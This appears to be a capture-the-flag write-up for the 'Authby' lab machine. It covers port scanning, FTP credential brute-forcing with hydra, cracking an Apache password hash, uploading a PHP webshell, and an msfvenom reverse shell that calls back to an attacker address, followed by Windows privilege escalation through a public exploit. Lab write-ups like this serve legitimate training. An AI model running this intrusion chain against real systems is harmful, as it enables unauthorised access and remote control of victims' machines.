# Authby

## Enumeration & scanning

- Various open ports. Of note are 21 (FTP), 242 (HTTP), 3145 (FTP?), 3389 (RDP).
- FTP anonymous mode is enabled (Nmap), can view folders and files.
- HTTP has basic authentication enabled.

``` sh
# Default scanning
sudo nmap -p- 192.168.228.46
sudo nmap -p 21,242,3145,3389 -A 192.168.228.46
nuclei -target http://192.168.228.46:242
# FTP (anonymous)
ftp 192.168.228.46
```

## Exploitation

- FTP anonymous mode has `accounts` folder with three users: `anonymous`, `admin`, and `Offsec`. These are likely FTP users based on `anonymous` in the list.
- We brute force `admin` credentials and find password `admin`.
- We login to FTP using `admin:admin` and find webapp files `index.php`, `.htaccess`, and `htpasswd`. We download them.
- We find hashed Apache password for `offsec` user on HTTP. We crack this and find `elite` to be the password.
- We login to HTTP webapp.
- We can upload files to FTP using the `admin` account, meaning that we can upload a webshell.
- We upload Windows shell: https://github.com/ivan-sincek/php-reverse-shell/
- Then we upload a reverse shell generated using `msfvenom` and execute it using the reverse shell.
- We then have local user and the flag.

``` sh
# Brute force FTP
hydra -l 'admin' -P SecLists/Passwords/Default-Credentials/default-passwords.txt ftp://192.168.105.46 -V -I -e nsr
# FTP (admin:admin)
ftp 192.168.228.46
put simple_php_web_shell_post.php
# .htpasswd (Apache hash)
offsec:$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
# Login to webapp and execute webshell
# Generate reverse shell (only 32-bit worked)
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.183 LPORT=4444 -f exe -o reverse.exe
ftp 192.168.228.46
put reverse.exe
# Open listener
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.228.46;set LPORT 4444;run;"

# Get flag
C:\Users\apache\Desktop>type local.txt
type local.txt
21919774a78e07881c989b77cb53d3df
```

## Privilege Escalation

- Used SeImpersonatePrivilege but is not the correct method.
- Needed to use vulnerability.

``` sh
# NOT CORRECT METHOD
# Check privileges
whoami /priv
# Use meterpreter to escalate
getsystem

# CORRECT METHOD
searchsploit "Privilege Escalation" | uniq | grep -v metasploit | grep -i "windows "
# https://www.exploit-db.com/exploits/15589
# Upload to box
execute -f cscript -a C:/Users/apache/Desktop/15589.wsf
# RDP into box with new user
```

## References

- https://www.exploit-db.com/exploits/15589


## Rabbit holes

- Don't use SeImpersonatePrivilege when available, it's not the right method.
